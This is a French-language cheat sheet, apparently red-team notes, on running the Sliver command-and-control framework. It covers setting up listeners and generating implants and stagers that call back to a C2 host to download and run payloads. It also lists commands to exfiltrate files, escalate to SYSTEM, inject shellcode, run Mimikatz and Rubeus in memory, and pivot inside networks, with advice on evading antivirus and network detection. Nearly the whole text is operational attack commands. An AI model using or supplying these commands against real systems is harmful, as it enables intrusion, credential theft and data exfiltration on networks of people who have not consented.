
**Objectif :** Sliver est un framework de Command & Control (C2) moderne, multiplateforme (écrit en Go), conçu pour les opérations Red Team et les tests d'intrusion, avec un accent sur la sécurité opérationnelle (OPSEC) et la flexibilité.

**Source :** [https://github.com/BishopFox/sliver](https://github.com/BishopFox/sliver)

---

### 🔑 **Concepts Clés**

* **Serveur C2 (Sliver Server) :** Le composant central qui gère les écouteurs (listeners), les implants, et fournit la console d'interaction pour l'opérateur.
* **Listener :** Point d'écoute sur le serveur C2 où les implants se connectent (callback). Sliver supporte plusieurs protocoles (HTTP/S, mTLS, DNS, WireGuard...).
* **Profil (Profile) :** Définit les caractéristiques et le comportement d'un implant (type de communication, délais, indicateurs, etc.).
* **Implant (Beacon/Session) :** L'agent malveillant exécuté sur la machine cible.
    * **Beacon :** Mode asynchrone, l'implant se connecte périodiquement au C2 (check-in) pour récupérer des tâches. Plus discret.
    * **Session :** Mode interactif, connexion persistante permettant une interaction en temps réel (shell, etc.). Plus bruyant.
* **Stager :** Petit payload initial qui télécharge et exécute l'implant complet. Permet de réduire la taille initiale du malware.
* **Armory :** Système d'extensions pour ajouter des fonctionnalités via des BOFs (Beacon Object Files), des assemblies .NET, ou des alias de commandes. (Voir votre note `Armory.md`)

---

### 🖥️ **Gestion du Serveur C2**

#### Démarrer le serveur Sliver

```bash
# Démarrage simple (génère les certificats/clés si nécessaire)
./sliver-server

# Démarrer avec une base de données existante
./sliver-server --database /chemin/vers/sliver.db --lhost <IP_Serveur_C2>
```

* **Contexte :** Lance le serveur C2 et sa console interactive. La première exécution génère les configurations et bases de données nécessaires.
* **Astuce :** Utilisez `--lhost` pour spécifier l'adresse IP que les implants devront contacter, surtout si le serveur est derrière un redirecteur ou NAT.

#### Commandes de base de la console Sliver

```sliver
help             # Affiche l'aide générale ou pour une commande spécifique
profiles         # Gérer les profils d'implants
listeners        # Gérer les listeners
jobs             # Gérer les tâches en arrière-plan
implants         # Gérer les implants générés
sessions         # Lister et interagir avec les sessions interactives
beacons          # Lister et interagir avec les beacons asynchrones
use <id>         # Sélectionner une session ou un beacon pour interagir
exit / quit      # Quitter la console Sliver
```

---

### 👂 **Gestion des Listeners**

* **Objectif :** Créer des points d'écoute pour les callbacks des implants.

#### Créer un Listener HTTP(S)

```sliver
# HTTP simple (moins sécurisé, plus facile à détecter)
http --bind :80 --lhost <IP_ou_Domaine_C2>

# HTTPS (chiffrement TLS standard)
https --bind :443 --lhost <IP_ou_Domaine_C2> [--letsencrypt]
# --letsencrypt : Tente d'obtenir un certificat Let's Encrypt valide (nécessite port 80 ouvert et nom de domaine configuré)
```

* **Contexte :** Listeners basés sur HTTP/S, courants mais potentiellement sujets à l'inspection.

#### Créer un Listener mTLS (Mutual TLS)

```sliver
mtls --bind :443 --lhost <IP_ou_Domaine_C2>
```

* **Contexte :** Utilise TLS avec authentification mutuelle (le client et le serveur vérifient leurs certificats respectifs).
* **Usage :** Plus sécurisé et discret que HTTPS standard, car le trafic ne ressemble pas à du trafic web classique sans les bons certificats.

#### Créer un Listener DNS

```sliver
dns --domain <votre_domaine_controle>
```

* **Contexte :** Communication C2 via des requêtes DNS (TXT, CNAME, A...).
* **Usage :** Très discret, peut contourner des firewalls stricts qui n'inspectent pas le trafic DNS. Nécessite de contrôler un nom de domaine et de configurer les enregistrements NS pour pointer vers votre serveur Sliver.
* **Prérequis :** Contrôle d'un nom de domaine et configuration DNS appropriée.

#### Lister les listeners actifs

```sliver
listeners
jobs # Les listeners tournent comme des jobs
```

#### Arrêter un listener

```sliver
jobs # Trouver l'ID du job du listener
jobs kill <job_id>
```

---

### 🧬 **Génération d'Implants et Stagers**

* **Objectif :** Créer les exécutables (ou shellcode) à déployer sur les cibles.

#### Générer un implant complet (stageless)

```sliver
# Utilise le profil par défaut et se connecte au premier listener compatible (ex: mTLS)
generate --save /chemin/vers/implant_mtls

# Spécifier un protocole et un OS
generate --mtls <IP_C2>:<Port> --os windows --arch amd64 --format exe --save /chemin/vers/implant_win.exe
generate --http <IP_C2>:<Port> --os linux --arch amd64 --format elf --save /chemin/vers/implant_linux

# Options courantes :
# --os <windows|linux|macos> : Système d'exploitation cible
# --arch <amd64|386> : Architecture cible
# --format <exe|shared|service|shellcode> : Format de sortie
# --skip-symbols : Réduit la taille, peut aider à l'évasion
# --save <chemin> : Chemin où sauvegarder l'implant
```

* **Contexte :** Crée un implant autonome contenant toute la configuration nécessaire pour se connecter au C2.
* **Usage :** Déploiement direct sur la cible. Plus gros fichier, mais ne nécessite pas de seconde étape de téléchargement.

#### Générer un stager

```sliver
generate stager --lhost <IP_C2> --lport <Port_Listener> --protocol <http|https|mtls> --os windows --arch amd64 --format exe --save /chemin/vers/stager.exe
```

* **Contexte :** Crée un petit payload qui, une fois exécuté, contacte le listener spécifié pour télécharger et exécuter l'implant complet en mémoire.
* **Usage :** Utile pour réduire la taille du payload initial (évasion AV, limites de taille d'upload) ou pour des vecteurs d'accès comme les macros Office.
* **Options courantes :** Similaires à `generate`, plus `--lhost`, `--lport`, `--protocol` pour spécifier le listener de staging.

---

### 🎮 **Interaction avec les Implants**

#### Lister les Beacons et Sessions

```sliver
beacons    # Lister les implants en mode beacon (asynchrone)
sessions   # Lister les implants en mode session (interactif)
```

#### Passer en mode interactif avec un Beacon

```sliver
use <beacon_id>
interactive
```

* **Contexte :** Convertit un beacon asynchrone en session interactive persistante.
* **OPSEC :** Augmente le "bruit" réseau et la détectabilité par rapport au mode beacon.

#### Utiliser une Session ou un Beacon

```sliver
use <session_id | beacon_id>
```

* **Contexte :** Sélectionne un implant pour lui envoyer des commandes. Le prompt change pour indiquer l'implant actif.
* **Exemple Prompt :** `sliver (IMPLANT_NAME)`

#### Mettre une session en arrière-plan

```sliver
background
```

* **Contexte :** Retourne à la console principale de Sliver tout en gardant la session active.

---

### 💻 **Commandes Courantes dans un Implant**

*(Doivent être exécutées après avoir sélectionné un implant avec `use <id>`)*

#### Obtenir un shell système

```sliver
shell
```

* **Contexte :** Ouvre un shell interactif (`cmd.exe` ou `/bin/bash`) sur la machine cible.
* **Usage :** Exécution de commandes système de base.

#### Exécuter une commande unique

```sliver
execute -o <commande> [arguments...]
# Exemple: execute -o net user
# Exemple: execute -o powershell.exe -ExecutionPolicy Bypass -C "Get-Process"
```

* **Contexte :** Exécute une commande et récupère sa sortie sans ouvrir de shell interactif complet. `-o` capture la sortie.
* **Usage :** Exécution rapide de commandes spécifiques.

#### Transfert de fichiers

```sliver
upload <fichier_local> <chemin_distant>
download <chemin_distant> [fichier_local]
```

* **Usage :** Transférer des outils vers la cible ou exfiltrer des fichiers.

#### Gestion des processus

```sliver
ps              # Lister les processus
kill <pid>      # Tuer un processus
getsystem       # Tente d'obtenir les privilèges SYSTEM (Windows)
procinject <pid> <shellcode_file.bin> # Injecter du shellcode dans un processus
```

* **Usage :** Énumération, élévation de privilèges, injection de code (ex: pour exécuter Mimikatz en mémoire).

#### Exécution d'extensions Armory

```sliver
# Exécuter un BOF (Beacon Object File)
execute-bof <fichier.o> <fonction_a_appeler> [arguments_encodés...]

# Exécuter un assembly .NET en mémoire
execute-assembly <fichier.exe> [arguments...]

# Utiliser un alias défini dans l'Armory
<nom_alias> [arguments...]
# Exemple (si un alias 'whoami_bof' existe): whoami_bof
```

* **Contexte :** Utilise les capacités d'exécution en mémoire de Sliver pour lancer des outils supplémentaires sans les écrire sur le disque.
* **Usage :** Exécuter des outils comme Mimikatz (BOF), Seatbelt (.NET), Rubeus (.NET) de manière plus discrète.

#### Pivoting et Tunnels

```sliver
pivot tcp <ip_cible_interne> <port_cible_interne> <port_local_serveur_c2> # Crée un tunnel TCP simple
socks5 start # Démarre un proxy SOCKS5 via l'implant
ifconfig # Voir/gérer les interfaces réseau pour le pivoting
```

* **Contexte :** Permet d'utiliser l'implant comme relais pour atteindre d'autres machines sur le réseau interne de la cible.
* **Usage :** Mouvement latéral, accès à des services non directement exposés.

---

### 🛡️ **Considérations OPSEC**

* **Profils :** Personnalisez les profils (`profiles new ...`) pour modifier les indicateurs par défaut de l'implant (User-Agent, délais de callback, jitter, etc.). Cela permet de mieux masquer l'activité C2 ou de l'adapter pour ressembler à du trafic légitime connu.
* **Staging :** Les stagers sont plus petits et peuvent être utiles pour contourner les détections initiales basées sur la taille ou pour des vecteurs comme les macros. Cependant, ils nécessitent une connexion supplémentaire pour télécharger l'implant complet, ce qui crée une autre opportunité de détection par les outils de surveillance réseau (NDR). Les implants stageless sont plus gros mais plus autonomes une fois exécutés.
* **Protocoles :** mTLS est généralement plus discret que HTTPS standard. 
* **Chiffrement :** Tout le trafic C2 de Sliver est chiffré (TLS, mTLS, WireGuard). Assurez-vous d'utiliser des protocoles robustes comme mTLS lorsque c'est possible.
* **Exécution en mémoire :** Privilégiez `execute-assembly` et `execute-bof` pour lancer des outils et des commandes. Cela évite d'écrire des fichiers exécutables sur le disque de la cible, réduisant ainsi considérablement les chances de détection par les antivirus basés sur les signatures de fichiers.
* **Nettoyage :** Une fois l'opération terminée, pensez à tuer les processus que vous auriez pu injecter (`procinject`), à arrêter les pivots (`pivot stop <id>`) et les proxies SOCKS (`socks5 stop`), et idéalement, à supprimer l'implant de la machine cible si la persistance n'est pas un objectif.

